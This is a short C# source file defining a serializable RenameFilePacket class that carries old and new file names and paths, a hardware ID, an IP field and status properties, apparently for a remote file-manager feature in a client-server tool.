using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class RenameFilePacket : IPacket
    {
        public RenameFilePacket() : base()
        {
            this.packetType = PacketType.FM_RENAME_FILE;
        }

        public RenameFilePacket(string oldName, string oldPath, string newName, string newPath)
        {
            this.packetType = PacketType.FM_RENAME_FILE;

            this.oldName = oldName;
            this.oldPath = oldPath;
            this.newName = newName;
            this.newPath = newPath;
        }

        public RenameFilePacket(string oldName, string oldPath, string newName, string newPath, string baseIp, string HWID) 
        {
            this.packetType = PacketType.FM_RENAME_FILE;
            this.baseIp = baseIp;
            this.HWID = HWID;

            this.oldName = oldName;
            this.oldPath = oldPath;
            this.newName = newName;
            this.newPath = newPath;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public string oldName { get; set; }
        public string oldPath { get; set; }
        public string newName { get; set; }
        public string newPath { get; set; }
        public bool isRenamed { get; set; }
    }
}
